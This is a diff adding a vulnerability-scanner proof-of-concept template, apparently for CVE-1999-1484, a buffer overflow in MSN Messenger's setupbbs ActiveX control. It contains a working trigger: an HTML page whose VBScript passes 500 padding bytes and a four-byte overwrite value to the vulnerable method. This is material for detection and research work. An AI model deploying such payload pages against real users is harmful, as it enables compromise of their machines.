@@ -1,0 +1,48 @@
+[info]
+author = "AVE"
+description = "通过构造包含特制 VBScript 的 HTML 页面，调用 setupbbs.ocx 控件的 bIsNewsServerConfigured 方法传入超长字符串触发缓冲区溢出。该 ActiveX 控件被标记为 Safe for Scripting，用户使用 IE 访问恶意页面即可触发。"
+id = "POC-AVE-1999-1909"
+name = "Microsoft MSN Messenger Service 1.0 Setup BBS ActiveX Control Buffer Overflow PoC"
+severity = "medium"
+tags = [
+    "cve-1999-1484",
+    "activex",
+    "buffer-overflow",
+    "msn-messenger",
+]
+vuln_id = [
+    "CVE-1999-1484",
+    "AVE-1999-1909",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<html>
+<body>
+<object classid="clsid:8F0F5093-0A70-11D0-BCA9-00C04FD85AA6" id="setupbbs"></object>
+<script language="vbscript">
+On Error Resume Next
+expstr = String(500, "A")
+expstr = expstr + Chr(202) + Chr(212) + Chr(248) + Chr(191)
+setupbbs.bIsNewsServerConfigured expstr
+If Err.Number <> 0 Then
+  document.write("VULNERABLE")
+End If
+</script>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["VULNERABLE"]
